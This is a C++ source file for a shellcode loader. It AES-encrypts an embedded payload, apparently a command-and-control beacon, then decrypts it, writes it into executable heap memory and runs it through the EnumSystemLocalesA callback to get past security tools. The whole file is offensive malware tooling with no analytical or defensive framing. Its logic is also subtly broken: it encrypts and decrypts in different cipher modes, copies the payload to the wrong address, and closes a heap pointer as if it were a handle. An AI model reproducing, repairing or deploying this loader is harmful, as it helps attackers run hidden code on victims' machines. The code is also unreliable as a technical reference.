#define WIN32_LEAN_AND_MEAN

#include <Windows.h>

#include "aes.h"
#include "filters.h"
#include "modes.h"
#include "osrng.h"


#ifdef _DEBUG
#pragma comment(lib, "cryptlib")
#else
#pragma comment(lib, "cryptlibRelease")
#endif

/* =================================================== DLL =================================================== */
void Run(BYTE * cryptBuffer, SIZE_T cryptBufferSize)
{
	BYTE key[CryptoPP::AES::DEFAULT_KEYLENGTH] = {};
	BYTE iv[CryptoPP::AES::BLOCKSIZE] = {};

	const SIZE_T extra = CryptoPP::AES::BLOCKSIZE + CryptoPP::AES::DEFAULT_KEYLENGTH;
	const SIZE_T beaconSize = cryptBufferSize - extra;

    memcpy(key, &cryptBuffer[cryptBufferSize - extra], CryptoPP::AES::DEFAULT_KEYLENGTH);
    memcpy(iv, &cryptBuffer[cryptBufferSize - CryptoPP::AES::BLOCKSIZE], CryptoPP::AES::BLOCKSIZE);
	
	CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
    dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));

    std::vector<BYTE> plainBuffer;
    plainBuffer.resize(beaconSize);

    CryptoPP::ArraySink rs(&plainBuffer[0], plainBuffer.size());

    CryptoPP::ArraySource s(
        cryptBuffer,
        beaconSize,
        true,
        new CryptoPP::StreamTransformationFilter(
            dec,
            new CryptoPP::Redirector(rs),
            CryptoPP::BlockPaddingSchemeDef::NO_PADDING
        )
    );

    plainBuffer.resize(rs.TotalPutLength());

    void* ha = nullptr;
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (hc)
        ha = HeapAlloc(hc, 0, plainBuffer.size());

    if (ha)
    {
        memcpy(&ha, plainBuffer.data(), plainBuffer.size());
        EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
        CloseHandle(ha);
    }
}

/* =================================================== Loader ================================================ */
int main()
{
	/* D:\Bureaublad\payload.bin (21-3-2021 23:57:28)
   StartOffset(h): 00000000, EindOffset(h): 00000341, Lengte(h): 00000342 */

	BYTE rawData[834] = {
		
	};

	SIZE_T rawDataSize = sizeof(rawData);

	BYTE key[CryptoPP::AES::DEFAULT_KEYLENGTH] = {};
	BYTE iv[CryptoPP::AES::BLOCKSIZE] = {};

	CryptoPP::AutoSeededRandomPool rnd;
	rnd.GenerateBlock(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
	rnd.GenerateBlock(iv, CryptoPP::AES::BLOCKSIZE);

	CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption enc;
	enc.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
	
    //std::ifstream in{ argv[1], std::ios::binary | std::ios::ate };
    //inSize = in.tellg();

    std::vector<BYTE> cipher, plain;
	for (BYTE& i : rawData)
	{
		plain.push_back(i);
	}

	int totalBullshit = (plain.size() | 15) + 1;
	int bullshitSize = totalBullshit - plain.size();

	for (int i = bullshitSize; i--;)
	{
		plain.push_back(0x00);
	}
	
    cipher.resize(plain.size() + CryptoPP::AES::BLOCKSIZE);
    CryptoPP::ArraySink rs(&cipher[0], cipher.size());

    CryptoPP::ArraySource(
		plain.data(),
        plain.size(), 
        true,
        new CryptoPP::StreamTransformationFilter(
            enc, 
            new CryptoPP::Redirector(rs),
			CryptoPP::BlockPaddingSchemeDef::NO_PADDING
        )
    );

    cipher.resize(rs.TotalPutLength());

    BYTE payload[CryptoPP::AES::BLOCKSIZE + CryptoPP::AES::DEFAULT_KEYLENGTH] = {};
    std::copy_n(key, CryptoPP::AES::DEFAULT_KEYLENGTH, payload);
    std::copy_n(iv, CryptoPP::AES::BLOCKSIZE, payload + CryptoPP::AES::DEFAULT_KEYLENGTH);

    for (BYTE& i : payload)
    {
        cipher.push_back(i);
    }

    Run(cipher.data(), cipher.size());
}